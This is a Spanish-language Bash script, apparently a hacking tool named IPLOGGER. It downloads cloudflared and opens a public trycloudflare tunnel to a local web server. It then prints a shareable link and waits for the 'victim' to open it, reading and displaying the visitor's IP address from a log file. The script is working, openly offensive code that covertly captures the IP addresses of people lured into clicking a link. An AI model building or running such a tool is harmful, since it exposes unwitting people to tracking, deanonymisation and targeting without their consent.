#function servidor() {
 # echo -e "\n\033[92m[~] Iniciando servidor php..."
  #php -S localhost:8080 -t pagina #> /dev/null 2>&1 &
#}

if [[ -e "log.log" ]]; then
	rm -rf "log.log"
fi

function capturar_ip() {
  IP=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
  IFS=$'\n'
  echo -e "\n\033[94m[~] IP de la victima: $IP"
}

function capturardatos() {
  echo -e "\n\033[36m[~] Esperando a que la victima abra el link presiona CTRL + C para salir"
  while true; do
    if [[ -e "ip.txt" ]]; then
         echo -e "\n\033[94m[~] IP de la victima  encontrado!"
         capturar_ip
         rm -rf ip.txt
    fi
  done
}

function servidorcloud() {
  sleep 4
  echo -e "\n\033[92m[~] Iniciando servidor cloudflare..."
  if [[ `command -v termux-chroot` ]]; then
      
      # php -S localhost:8080 > /dev/null 2>&1 &
       termux-chroot ./servidor/cloudflared tunnel -url localhost:8080 --logfile log.log > /dev/null 2>&1 &
       sleep 2
  else
       
       # php -S localhost:8080 > /dev/null 2>&1 &
       ./servidor/cloudflared tunnel -url localhost:8080 --logfile log.log > /dev/null 2>&1 &
       sleep 2
  fi

     cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "log.log")
     echo -e "\n\033[31;1m[~] Link: $cldflr_link"
     capturardatos
}

function cloudflare() {
    if [[ -e "servidor/cloudflared" ]]; then
         echo -e "\n\033[92m[~] Cloudflare ya esta instalado"
    else
         distro=`uname -m`
         if [[ ("$distro" == *'arm'*) || ("$distro" == *'Android'*) ]]; then
            wget https://github.com/cloudflare/cloudflared/releases/download/2022.2.0/cloudflared-linux-arm
            mv 'cloudflared-linux-arm' servidor/cloudflared
            cd servidor && chmod +x cloudflared
         elif [[ ("$distro" == *'x86_64'*) ]]; then
            wget https://github.com/cloudflare/cloudflared/releases/download/2022.2.0/cloudflared-linux-amd64
            mv 'cloudflared-linux-amd64' servidor/cloudflared
            cd servidor && chmod +x cloudflared
    fi  fi
}

function menu() {
  killall php
  killall cloudflare
  clear
  echo -e "\033[33m
  _____ _____  _      ____   _____  _____ ______ _____  
 |_   _|  __ \| |    / __ \ / ____|/ ____|  ____|  __ \ 
   | | | |__) | |   | |  | | |  __| |  __| |__  | |__) |
   | | |  ___/| |   | |  | | | |_ | | |_ |  __| |  _  / 
  _| |_| |    | |___| |__| | |__| | |__| | |____| | \ \ 
 |_____|_|    |______\____/ \_____|\_____|______|_|  \_\
                          By: Euronymou5
  "
  echo -e "\n\033[32m[1] Iniciar link iplogger"
  echo -e "\n[99] Salir"
  read -p "root@user: >> "
  case $REPLY in
    1 | 01)
        servidorcloud;;
    99)
        exit 0;
  esac
}

cloudflare
menu
